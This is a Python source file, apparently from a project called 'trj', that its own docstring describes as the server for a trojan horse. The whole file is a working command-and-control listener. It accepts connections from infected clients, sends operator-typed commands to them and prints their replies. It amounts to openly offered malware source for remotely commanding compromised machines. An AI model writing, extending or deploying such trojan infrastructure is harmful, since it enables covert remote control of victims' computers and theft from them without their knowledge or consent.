# This is the main file for starting the server of trj.
# This part of the program has been created using Python.
#
# Use this server at your own risk.
# More information at: 
# 
#   https://github.com/pblcc/trj
import socket
import threading
import json

class Server:
    """
    This class is used to manage the server for the trj trojan horse,
    coded using Python
    """
    def __init__(self, port, decode_format, server_ip, bites):
        """
        This is the constructor method for the Server class, from here all the
        attributes of the class are created

        Parameters:
            port => The port the server should connect to
            decode_format => The format of decodification
            server_ip => The IP of the server
            bites => The number of maximum bites of the server
        """
        self.PORT = port
        self.FORMAT = decode_format
        self.SERVER_IP = server_ip
        self.BITES = bites
        self.RECV_BITES = 2048 # The maximum number of bites the server can recive
        self.ADDR = (self.SERVER_IP, self.PORT)
        self.DISCONNECT_MESSAGE = "!DISCONNECT" # msg to disconnect from the client
        # create the actual server of the instance
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(self.ADDR) # bind the server to the addr

    def handle_client(self, conn, addr):
        """
        This method is a thread used to handle all the clients that connect to
        the server.
        Parameters:
            conn => The connection of the client
            addr => The addr address of the server
        """
        # some debug from the server
        print(f"[NEW CONNECTION] {addr} connected.")
        connected = True # 1 if the client is still connected
        while connected:
            command = ""
            command = input("command: ")
            if command != '\n' and command:
                conn.send(command.encode(self.FORMAT))
                # recive the message from the client
                client_msg = conn.recv(self.RECV_BITES).decode(self.FORMAT)
                print(client_msg)
        conn.close() # close the connection if disconnectedA

    def start(self):
        """
        This method is used to start the server itself using the .listen() method
        and then starting a while loop to create the threads
        Parameters:
            self => The Server() class
        """
        # start the server and listen it
        self.server.listen()
        print(f"[LISTENING] Server is listening on {self.SERVER_IP}")
        running = True
        while running:
            try:
                conn, addr = self.server.accept()
                # create the thread for the self.handle_client method
                thread = threading.Thread(target=self.handle_client, args=(conn, addr))
                thread.start()
                print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")
            except Exception as e:
                # report the bug informing the user
                print(f"[SERVER CRASH]: Fatal error, {e}")
                running = False

def load_sc():
    """
    This function is used to load the server configuration 
    and return it as a dic using json
    """
    ROUTE = "../conf.json"
    with open(ROUTE) as f:
        return json.load(f)

if __name__ == '__main__':
    conf = load_sc()
    PORT = conf['port']
    FORMAT = conf['format']
    BITES = conf['max bites']
    SERVER_IP = socket.gethostbyname(socket.gethostname())
    s = Server(PORT, FORMAT, SERVER_IP, BITES)
    s.start()
